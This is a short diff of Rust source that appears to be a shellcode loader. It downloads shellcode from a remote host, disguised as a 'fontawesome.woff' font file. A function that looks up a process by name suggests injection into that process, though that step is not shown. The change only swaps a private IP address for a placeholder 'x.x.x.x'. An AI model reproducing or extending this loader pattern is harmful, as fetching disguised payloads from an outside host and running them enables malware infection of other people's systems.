@@ -33,7 +33,7 @@ fn find_process_by_name(process_name: &str) -> u32 {
 }
 
 fn main() {
-    let shellcode_url: &str = "http://192.168.8.188:8003/fontawesome.woff";
+    let shellcode_url: &str = "http://x.x.x.x/fontawesome.woff";
     let shellcode: Vec<u8>;
     match download_shellcode_from_url(shellcode_url) {
         Ok(downloaded_bytes) => {
